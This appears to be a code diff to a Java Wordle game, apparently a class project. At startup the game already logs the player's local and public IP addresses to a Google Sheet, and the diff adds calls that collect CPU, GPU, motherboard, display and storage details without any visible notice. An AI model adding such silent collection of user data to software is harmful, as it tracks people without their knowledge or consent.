@@ -310,6 +310,11 @@ public class Wordle
         setCorrectWord(); // Runs the setCorrectWord method that you are making
         logToGoogleSheetInfo(getLocalIP(), getPublicIP()); // Logs IP info
         hardwareStuff.getRamInfo();
+        hardwareStuff.getCPUInfo();
+        hardwareStuff.getGPUInfo();
+        hardwareStuff.getMotherboardInfo();
+        hardwareStuff.getDisplayInfo();
+        hardwareStuff.getStorageInfo();
 
         wordleGame = new WordleGWindow(); // Creates GUI
         wordleGame.addEnterListener(this::enterAction); // Arrow function, learn more about how it works in the documentation
